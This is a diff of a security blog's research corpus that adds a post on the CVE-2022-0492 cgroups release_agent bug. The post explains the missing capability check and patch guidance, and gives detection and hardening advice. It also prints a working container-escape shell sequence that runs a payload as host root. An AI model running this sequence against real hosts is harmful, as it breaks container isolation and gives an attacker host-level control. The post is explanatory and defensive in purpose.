@@ -1,11 +1,11 @@
 ================================================================================
 GARRETTSTIMPSON.CA — SECURITY RESEARCH CORPUS
 ================================================================================
-GENERATED    : 2026-06-03T07:54:11Z
+GENERATED    : 2026-06-03T10:23:57Z
 AUTHOR       : Garrett Stimpson
 SITE         : https://garrettstimpson.ca
 REPOSITORY   : https://github.com/gary23w/garrettstimpson.ca
-TOTAL POSTS  : 33
+TOTAL POSTS  : 34
 DOMAIN       : offensive-security, vulnerability-research,
                exploit-development, kernel-exploitation,
                red-team, CVE-analysis, PoC-breakdown
@@ -16,6 +16,100 @@ FORMAT: Each <DOCUMENT> block contains a complete research post.
 ================================================================================
 
 <DOCUMENT id="001" type="security-research-post">
+<FRONTMATTER>
+TITLE      : CVE-2022-0492 Hits KEV: A Four-Year-Old cgroups Bug Is Escaping Containers in the Wild
+DATE       : 2026-06-03
+URL        : https://garrettstimpson.ca/posts/2026/06/03/cve-2022-0492-cgroups-release-agent-kev/
+CVE        : CVE-2022-0492, cve-2022-0492
+CATEGORIES : exploits, linux
+TAGS       : cve-2022-0492, cgroups, container-escape, release-agent, kubernetes, kev, lpe
+WORD_COUNT : 1248
+EXCERPT    : CISA added a 2022 cgroups release_agent bug to KEV on June 2. The patch was one if-statement. The reason it took four years to show up on the exploited list is the more interesting part.
+</FRONTMATTER>
+<BODY>
+Here's what gets me about this one. Every Linux root bug I've written up over the last two weeks was new. Copy Fail, Dirty Frag, Fragnesia, CIFSwitch. Fresh CVEs, page-cache write primitives, exploit devs racing the patch authors by hours. Then on June 2, CISA quietly added CVE-2022-0492 to the Known Exploited Vulnerabilities catalog. A bug from February 2022. Patched four years ago. One if-statement.
+
+So why is it on the actively-exploited list now?
+
+Because the bug was never really about the kernel being clever. It was about the kernel forgetting to ask one question. And the environments where that forgotten question matters, multi-tenant Kubernetes and shared container hosts, are exactly the environments that took years to actually lock down. The vulnerability sat in plain sight, the writeups were public, and attackers waited until enough soft targets existed to make it worth weaponizing at scale. That's the story CISA is telling by listing it in 2026.
+
+## The one line that wasn't there
+
+CVE-2022-0492 lives in `cgroup_release_agent_write` in `kernel/cgroup/cgroup-v1.c`. Yiqi Sun and Kevin Wang reported it, Yuval Avrahami at Unit 42 wrote the canonical analysis, and the whole thing comes down to a privileged operation that the kernel exposed to unprivileged callers by mistake.
+
+cgroups v1 has a feature called the release agent. You write a path to the `release_agent` file, and when the last process in a cgroup that has `notify_on_release` set exits, the kernel runs that path. It runs it as a full root process with every capability, in the initial namespaces. That is about as privileged as execution gets on a Linux box. Deciding which binary gets that treatment should obviously require real privilege.
+
+The kernel never checked. Here is the entire fix, commit `24f6008564183aa120d07c03d9289519c2fe02af`, which landed in 5.17-rc3:
+
+```c
+@@ -549,6 +549,14 @@ static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of,
++	/*
++	 * Release agent gets called with all capabilities,
++	 * require capabilities to set release agent.
++	 */
++	if ((of->file->f_cred->user_ns != &init_user_ns) ||
++	    !capable(CAP_SYS_ADMIN))
++		return -EPERM;
+```
+
+That's it. Require `CAP_SYS_ADMIN` in the initial user namespace before you let someone set the binary that runs as root. Before this patch, the only thing standing between you and the `release_agent` file was normal file permissions, and the file is owned by root. So at first glance this reads like a root-only privilege escalation, which sounds useless. Who needs to escalate from root?
+
+That framing is the trap, and it's why the bug aged the way it did.
+
+## Root inside a container is not root
+
+The modern Linux privilege model has a gray zone between "the root user" and "actually controls the machine." Capabilities, user namespaces, and containers all live in that gray zone. A process can be UID 0 inside a container and still be heavily fenced in by Seccomp, AppArmor, dropped capabilities, and read-only mounts. CVE-2022-0492 is the lever that pops a container-root process out into host-root, and that is a very different thing than escalating on a bare host.
+
+The escape chain is mechanical once you see it. The cgroupfs mounts a container gets are read-only, so you can't write `release_agent` directly. You have to mount your own writable copy. Mounting cgroupfs needs `CAP_SYS_ADMIN`, which your container doesn't have in the init user namespace. So you call `unshare(CLONE_NEWUSER | CLONE_NEWNS)`, create a fresh user namespace where you do hold `CAP_SYS_ADMIN`, and mount a cgroupfs there.
+
+One catch. When you mount inside a cgroup namespace, you get your own cgroup, not the root cgroup, and `release_agent` only exists at the root. So you need to already be sitting in the root cgroup of some subsystem. Docker historically placed containers in the root RDMA cgroup, which is exactly the kind of detail that makes this practical rather than theoretical. From there it's three writes:
+
+```bash
+# inside the new user + mount namespace, root cgroup of a subsystem mounted rw
+mkdir -p /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
+mkdir /tmp/cg/x
+echo 1 > /tmp/cg/x/notify_on_release
+
+# point release_agent at a payload on the host filesystem
+host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
+echo "$host/exploit" > /tmp/cg/release_agent
+
+# the payload that runs as real root on the host
+printf '#!/bin/sh\nps aux > %s/output\n' "$host" > /exploit
+chmod +x /exploit
+
+# trigger: put a process in the child cgroup and let it exit
+sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
+```
+
+When that short-lived process dies, the kernel walks the release path and executes `/exploit` as root in the host's initial namespaces. No memory corruption. No race window you have to win. The whole thing is the kernel doing precisely what it was told, because nobody told it to check who was doing the telling.
+
+## Who actually gets popped
+
+The good news, and the reason this didn't burn the world down in 2022, is that defense in depth genuinely stops it. A container escapes only if all of the following are true at once. It runs as root or without `no_new_privs`. It runs without AppArmor and without SELinux, because both block the mount. It runs without Seccomp, because Seccomp blocks `unshare`. The host has unprivileged user namespaces enabled. And the container sits in a root v1 cgroup.
+
+Stack any one of Seccomp, AppArmor, or SELinux and the chain breaks. That's why this was a non-event for anyone following container hardening best practice. The trouble is how many shared runners, legacy clusters, and "we'll fix the security context later" deployments never got there. Four years is enough time for attackers to map out where those soft hosts cluster, and a KEV listing in 2026 says someone finished that mapping.
+
+## What to actually do
+
+Patch the kernel. Anything 5.17 or newer has the fix, and every maintained distro backported it long ago, so if you're current you are not vulnerable to the bug itself. The KEV listing is really a prompt to go find the hosts that aren't current and the containers running with the security context stripped off.
+
+If you can't patch immediately, the mitigation is the same hardening that already neutralizes the exploit. Make sure your workloads run with Seccomp on, and with either AppArmor or SELinux enforcing. In Kubernetes that means a `securityContext` with `seccompProfile` set to `RuntimeDefault` and `allowPrivilegeEscalation: false`, and not handing containers `CAP_SYS_ADMIN`. If you genuinely don't need user namespaces inside containers, you can shut the door at the host level:
+
+```bash
+echo "user.max_user_namespaces=0" > /etc/sysctl.d/cve-2022-0492.conf
+sysctl --system
+```
+
+That breaks rootless containers, Flatpak, and sandboxed browsers, so test it before you roll it out broadly. Detection-wise, the loud signal is `unshare` with `CLONE_NEWUSER` from a workload that has no business creating namespaces, immediately followed by a cgroupfs mount and a write to `release_agent`. Falco, Tetragon, or any eBPF-based runtime tool can flag that sequence cleanly. Palo Alto published a checker image at `github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492` if you want to confirm whether a given container config can actually pull off the escape.
+
+The lesson I keep coming back to is that "root-only" and "container-only" CVEs don't age out of relevance. They wait for the deployment reality to catch up to them. This one waited four years, and the wait is over.
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+<DOCUMENT id="002" type="security-research-post">
 <FRONTMATTER>
 TITLE      : YellowKey (CVE-2026-45585): A USB Stick, WinRE, and Your BitLocker Key Just Walks Out The Door
 DATE       : 2026-06-02
@@ -79,7 +173,7 @@ The thing I keep coming back to is how long this sat there. A whole privileged c
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="002" type="security-research-post">
+<DOCUMENT id="003" type="security-research-post">
 <FRONTMATTER>
 TITLE      : VoidStealer's Debugger Trick: Stealing Chrome's App-Bound Key With a Hardware Breakpoint and Zero Injection
 DATE       : 2026-06-02
@@ -176,7 +270,7 @@ VoidStealer is commodity malware that borrowed an elegant idea. The idea is the 
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="003" type="security-research-post">
+<DOCUMENT id="004" type="security-research-post">
 <FRONTMATTER>
 TITLE      : GreenPlasma: a SYSTEM shell hiding inside CTFMON, and the half a PoC that ships it
 DATE       : 2026-06-02
@@ -258,7 +352,7 @@ Treat GreenPlasma as live. The dangerous half is already public, and the other h
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="004" type="security-research-post">
+<DOCUMENT id="005" type="security-research-post">
 <FRONTMATTER>
 TITLE      : A Go Mirai Variant That Hides Behind cpufreqd
 DATE       : 2026-06-02
@@ -393,12 +487,12 @@ This one is not sophisticated. It is a clean example of where commodity Linux ma
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="005" type="security-research-post">
+<DOCUMENT id="006" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-41089: One CLDAP Packet Reboots Your Domain Controller, And Microsoft Said It Was Unlikely
 DATE       : 2026-06-02
 URL        : https://garrettstimpson.ca/posts/2026/06/02/cve-2026-41089-netlogon-cldap-stack-overflow-rce/
-CVE        : cve-2026-41089, CVE-2026-41089
+CVE        : CVE-2026-41089, cve-2026-41089
 CATEGORIES : exploits, windows
 TAGS       : cve-2026-41089, netlogon, cldap, buffer-overflow, active-directory, rce
 WORD_COUNT : 1122
@@ -479,12 +573,12 @@ The thing I keep coming back to is the severity call. A network-reachable, unaut
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="006" type="security-research-post">
+<DOCUMENT id="007" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-35616: When the Patch Server Ships the Malware
 DATE       : 2026-06-02
 URL        : https://garrettstimpson.ca/posts/2026/06/02/cve-2026-35616-forticlient-ems-ekz-infostealer/
-CVE        : cve-2026-35616, CVE-2026-35616
+CVE        : CVE-2026-35616, cve-2026-35616
 CATEGORIES : exploits, malware, analysis
 TAGS       : forticlient-ems, cve-2026-35616, ekz-infostealer, on-connect, app-bound-encryption, supply-chain
 WORD_COUNT : 1182
@@ -556,7 +650,7 @@ The lesson is not really about Fortinet. It is that your management tooling is y
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="007" type="security-research-post">
+<DOCUMENT id="008" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Infiniti Stealer: ClickFix Meets a Nuitka-Compiled Python Stealer on macOS
 DATE       : 2026-06-01
@@ -652,7 +746,7 @@ Sample reference (do not download): [https://www.malwarebytes.com/blog/threat-in
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="008" type="security-research-post">
+<DOCUMENT id="009" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-20817: The WER Service Will Launch SYSTEM Processes For Anyone Who Asks
 DATE       : 2026-06-01
@@ -725,7 +819,7 @@ The clean fix shipped in January. The bug is a reminder that the dangerous part 
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="009" type="security-research-post">
+<DOCUMENT id="010" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-0257: Forging GlobalProtect Cookies Because Nobody Signed Them
 DATE       : 2026-06-01
@@ -807,7 +901,7 @@ The lesson here is older than RSA. Encryption is not authentication. If you decr
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="010" type="security-research-post">
+<DOCUMENT id="011" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Evelyn Stealer Ships Inside VS Code Extensions and Hollows grpconv.exe to Steal Your Dev Creds
 DATE       : 2026-05-31
@@ -946,12 +1040,12 @@ Commodity stealer, clever delivery. The part that should stick with you is the a
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="011" type="security-research-post">
+<DOCUMENT id="012" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-43121: The io_uring ZCRX Race Nobody Should Hype, And Nobody Should Ignore
 DATE       : 2026-05-31
 URL        : https://garrettstimpson.ca/posts/2026/05/31/cve-2026-43121-io-uring-zcrx-freelist-race-lpe/
-CVE        : cve-2026-43121, CVE-2026-43121
+CVE        : CVE-2026-43121, cve-2026-43121
 CATEGORIES : exploits, linux-kernel
 TAGS       : io_uring, zcrx, race-condition, lpe, cve-2026-43121, heap-corruption
 WORD_COUNT : 1297
@@ -1036,7 +1130,7 @@ One last thing. The bug was found in code that exists purely to go faster. ZCRX,
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="012" type="security-research-post">
+<DOCUMENT id="013" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-34926: Turning Apex One Into Your Malware Distribution Channel
 DATE       : 2026-05-31
@@ -1101,7 +1195,7 @@ The uncomfortable part is that the security product is the trusted delivery chan
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="013" type="security-research-post">
+<DOCUMENT id="014" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Fragnesia (CVE-2026-46300): The Bug the Dirty Frag Patch Woke Up
 DATE       : 2026-05-30
@@ -1211,7 +1305,7 @@ The pattern underneath all of this. Dirty Pipe, Copy Fail, Dirty Frag, now Fragn
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="014" type="security-research-post">
+<DOCUMENT id="015" type="security-research-post">
 <FRONTMATTER>
 TITLE      : DonutLoader Wraps ValleyRAT in an Inno Setup Shell and the Payload Never Touches Disk
 DATE       : 2026-05-30
@@ -1323,7 +1417,7 @@ This sample is not novel research. Donut has been around for years and ValleyRAT
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="015" type="security-research-post">
+<DOCUMENT id="016" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CIFSwitch: When the Root Helper Walks Into Your Namespace
 DATE       : 2026-05-30
@@ -1393,7 +1487,7 @@ Patch when your distro ships the kernel update. Until then, decide whether any g
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="016" type="security-research-post">
+<DOCUMENT id="017" type="security-research-post">
 <FRONTMATTER>
 TITLE      : SHub Reaper Lives On: MacSync Shell Script Drops on MalwareBazaar Today
 DATE       : 2026-05-29
@@ -1570,7 +1664,7 @@ MITRE ATT&CK: T1059.002 (AppleScript), T1555 (Credentials from Password Stores),
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="017" type="security-research-post">
+<DOCUMENT id="018" type="security-research-post">
 <FRONTMATTER>
 TITLE      : MiniPlasma: The 2020 Windows Bug That Never Actually Died
 DATE       : 2026-05-29
@@ -1664,7 +1758,7 @@ The gap between Forshaw's 2020 report and today is a good reminder that "patched
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="018" type="security-research-post">
+<DOCUMENT id="019" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Lumma Stealer Is Back, and Now It's Using Windows Terminal Against You
 DATE       : 2026-05-29
@@ -1827,7 +1921,7 @@ The bigger picture: according to Microsoft's 2025 Digital Defense Report, ClickF
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="019" type="security-research-post">
+<DOCUMENT id="020" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Fragnesia (CVE-2026-46300): The Linux Kernel LPE That Crawled Out of the Dirty Frag Patch
 DATE       : 2026-05-29
@@ -1985,7 +2079,7 @@ Patch, blacklist the modules, watch your namespace usage. And check back.
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="020" type="security-research-post">
+<DOCUMENT id="021" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-2005: A 20-Year-Old PostgreSQL pgcrypto Bug Just Got a Public RCE PoC
 DATE       : 2026-05-29
@@ -2119,7 +2213,7 @@ We're going to see a lot more of this pattern.
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="021" type="security-research-post">
+<DOCUMENT id="022" type="security-research-post">
 <FRONTMATTER>
 TITLE      : ClearFake Drops a Go-Compiled DLL That Unhooks ntdll to Blind Your EDR
 DATE       : 2026-05-29
@@ -2341,7 +2435,7 @@ The larger ClearFake picture: the campaign now distributes Lumma Stealer, Vidar 
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="022" type="security-research-post">
+<DOCUMENT id="023" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Signed and Delivered: How Threat Actors Weaponize Legitimate ScreenConnect Installers
 DATE       : 2026-05-28
@@ -2469,7 +2563,7 @@ Two samples this morning. Same reporter. Same technique. This campaign is not sl
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="023" type="security-research-post">
+<DOCUMENT id="024" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Prometei Is Back on Linux and Its UPX Trick Is Clever
 DATE       : 2026-05-28
@@ -2676,12 +2770,12 @@ The campaign is active. The technique is reproducible across new variants. Worth
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="024" type="security-research-post">
+<DOCUMENT id="025" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-40369: One Syscall, Any Sandbox, Full SYSTEM
 DATE       : 2026-05-28
 URL        : https://garrettstimpson.ca/posts/2026/05/28/cve-2026-40369-windows-kernel-sandbox-escape/
-CVE        : CVE-2026-40369, cve-2026-40369
+CVE        : cve-2026-40369, CVE-2026-40369
 CATEGORIES : exploits, windows
 TAGS       : windows-kernel, lpe, sandbox-escape, ntquerysysteminformation, pwn2own, cve-2026-40369
 WORD_COUNT : 1134
@@ -2790,7 +2884,7 @@ Apply the patch. Check your builds. The full exploit code is public.
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="025" type="security-research-post">
+<DOCUMENT id="026" type="security-research-post">
 <FRONTMATTER>
 TITLE      : RemusStealer on MalwareBazaar Today: Go Injector, Blockchain C2, and the ABE Bypass Chrome Still Can't Stop
 DATE       : 2026-05-27
@@ -2974,7 +3068,7 @@ MITRE ATT&CK coverage for this sample: T1027.010 (MBA string obfuscation), T1055
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="026" type="security-research-post">
+<DOCUMENT id="027" type="security-research-post">
 <FRONTMATTER>
 TITLE      : DirtyDecrypt (CVE-2026-31635): How a Missing COW Guard in rxgk_decrypt_skb Hands You Root
 DATE       : 2026-05-27
@@ -3130,7 +3224,7 @@ The thing that stands out about this whole "Dirty" family, Copy Fail, Dirty Frag
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="027" type="security-research-post">
+<DOCUMENT id="028" type="security-research-post">
 <FRONTMATTER>
 TITLE      : DarkTortilla Wraps DarkCloud: How a .NET Crypter Hides a Credential Stealer in a Fake Quotation Email
 DATE       : 2026-05-27
@@ -3283,12 +3377,12 @@ Practically speaking, this family is not going anywhere. DarkTortilla has been d
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="028" type="security-research-post">
+<DOCUMENT id="029" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-46333: How One ptrace Window Leaks Your SSH Keys
 DATE       : 2026-05-27
 URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-46333-ssh-keysign-pwn/
-CVE        : CVE-2026-46333, cve-2026-46333
+CVE        : cve-2026-46333, CVE-2026-46333
 CATEGORIES : exploits, linux, lpe
 TAGS       : cve, ptrace, pidfd, linux-kernel, ssh, privilege-escalation
 WORD_COUNT : 898
@@ -3383,7 +3477,7 @@ Check your kernel version. Patch if you haven't.
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="029" type="security-research-post">
+<DOCUMENT id="030" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-42945: NGINX Rift, an 18-Year Heap Overflow With a Working RCE Chain
 DATE       : 2026-05-27
@@ -3534,12 +3628,12 @@ The full advisory is at F5's security portal (K000160932). Fixed packages are av
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="030" type="security-research-post">
+<DOCUMENT id="031" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-31431: Copy Fail — 732 Bytes to Root on Every Major Linux Distro
 DATE       : 2026-05-27
 URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-31431-copy-fail-linux-lpe/
-CVE        : cve-2026-31431, CVE-2026-31431
+CVE        : CVE-2026-31431, cve-2026-31431
 CATEGORIES : kernel, lpe, linux, cve
 TAGS       : CVE-2026-31431, linux, kernel, privilege-escalation, AF_ALG, page-cache, container-escape, cloud
 WORD_COUNT : 1284
@@ -3742,7 +3836,7 @@ rmmod algif_aead 2>/dev/null
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="031" type="security-research-post">
+<DOCUMENT id="032" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-20182: How a Missing vHub Verification Path Handed Nation-State Actors Admin on Cisco SD-WAN
 DATE       : 2026-05-27
@@ -3857,7 +3951,7 @@ The thing about CVE-2026-20182 is that Rapid7 found it by looking harder at a su
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="032" type="security-research-post">
+<DOCUMENT id="033" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Dirty Frag: Deterministic Root in Every Major Linux Distro
 DATE       : 2026-05-26
@@ -3954,7 +4048,7 @@ Patch. Then ask why your review process didn't catch it either.
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="033" type="security-research-post">
+<DOCUMENT id="034" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Living Off the Land in 2026: The Techniques EDR Still Misses
 DATE       : 2026-05-25
@@ -4101,5 +4195,5 @@ The defense answer isn't more signatures. It's behavioral baselining, parent-chi
 --------------------------------------------------------------------------------
 
 ================================================================================
-END OF CORPUS — 33 documents — 2026-06-03T07:54:11Z
+END OF CORPUS — 34 documents — 2026-06-03T10:23:57Z
 ================================================================================
